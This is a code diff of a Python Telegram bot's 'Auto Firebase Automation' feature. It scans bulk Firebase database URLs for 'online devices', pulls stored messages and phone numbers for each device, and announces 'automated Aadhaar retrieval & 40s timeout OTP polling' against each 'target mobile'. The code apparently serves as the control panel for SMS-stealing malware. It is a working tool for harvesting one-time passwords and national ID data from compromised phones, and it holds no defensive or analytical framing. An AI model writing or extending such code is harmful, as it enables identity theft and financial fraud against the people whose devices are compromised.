@@ -654,7 +654,7 @@ def handle_admin_callbacks(call):
         bot.send_message(
             chat_id,
             "⚡ <b>Auto Firebase Automation</b>\n\n"
-            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links supported). Bot sabhi links scan karega, total online devices batayega aur automatically process karega:\n\n"
+            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links supported). Bot sabhi links scan karega, combined online devices count karega aur automatically process karega:\n\n"
             "Type <b>Cancel</b> to abort.",
             reply_markup=cancel_markup,
             parse_mode='HTML'
@@ -1370,43 +1370,53 @@ def handle_all(message):
 
         def run_auto_firebase_bulk_loop():
             try:
-                total_processed = 0
-                for target_firebase_url in urls:
-                    base_url = target_firebase_url.split('?')[0].rstrip('/')
-                    query = target_firebase_url.split('?')[1] if '?' in target_firebase_url else ''
-                    
-                    if not base_url.endswith('/'):
-                        base_url += '/'
-                    
-                    clients_endpoint = f"{base_url}clients.json"
-                    if query:
-                        clients_endpoint += f"?{query}"
+                total_online_all = 0
+                database_tasks = []
+
+                # Phase 1: Scan all URLs and count online devices
+                for item in urls:
+                    item = item.strip()
+                    if "?" in item:
+                        base_url, query = item.split("?", 1)
+                        if not base_url.endswith("/"):
+                            base_url += "/"
+                        clients_endpoint = f"{base_url}clients.json?{query}"
+                    else:
+                        if not item.endswith("/"):
+                            item += "/"
+                        clients_endpoint = f"{item}clients.json"
+                        query = ""
 
                     try:
                         res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=12)
-                        if res.status_code != 200:
-                            continue
-                        data = res.json() or {}
+                        if res.status_code == 200:
+                            data = res.json() or {}
+                            online_cids = [
+                                cid for cid, cdata in data.items() 
+                                if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("online") is True)
+                            ]
+                            if not online_cids and len(data) > 0:
+                                online_cids = list(data.keys())
+
+                            if online_cids:
+                                total_online_all += len(online_cids)
+                                database_tasks.append((base_url, query, online_cids, item))
                     except Exception:
                         continue
 
-                    online_cids = [
-                        cid for cid, cdata in data.items() 
-                        if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("online") is True)
-                    ]
-                    if not online_cids and len(data) > 0:
-                        online_cids = list(data.keys())
+                bot.send_message(
+                    chat_id,
+                    "🔥 <b>AUTO FIREBASE COMBINED REPORT & EXECUTION</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🔗 <b>Total Checked URLs:</b> <code>{len(urls)}</code>\n"
+                    f"🟢 <b>Combined Total Online / Active Devices:</b> <code>{total_online_all}</code>\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "⚡ <i>Executing automated Aadhaar retrieval & 40s timeout OTP polling across all combined databases...</i>",
+                    parse_mode='HTML'
+                )
 
-                    if not online_cids:
-                        continue
-
-                    bot.send_message(
-                        chat_id,
-                        f"🔥 <b>Processing Database:</b> <code>{base_url}</code>\n"
-                        f"🟢 Active Devices: <b>{len(online_cids)}</b>",
-                        parse_mode='HTML'
-                    )
-
+                total_processed = 0
+                for base_url, query, online_cids, full_item in database_tasks:
                     for cid in online_cids:
                         msg_endpoint = f"{base_url}messages/{cid}.json"
                         if query:
@@ -1433,7 +1443,7 @@ def handle_all(message):
 
                         bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
                         
-                        os.environ['FIREBASE_URL'] = target_firebase_url
+                        os.environ['FIREBASE_URL'] = full_item
 
                         user_info = {'username': 'AutoFirebase', 'first_name': 'AutoBot'}
                         future = asyncio.run_coroutine_threadsafe(
@@ -1448,7 +1458,7 @@ def handle_all(message):
                         
                         time.sleep(2)
 
-                bot.send_message(chat_id, f"✅ <b>Auto Firebase finished! Successfully processed {total_processed} numbers across all {len(urls)} links.</b>", parse_mode='HTML')
+                bot.send_message(chat_id, f"✅ <b>Auto Firebase finished! Successfully processed {total_processed} numbers across all combined databases.</b>", parse_mode='HTML')
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Auto Firebase Error: {esc(e)}")
 
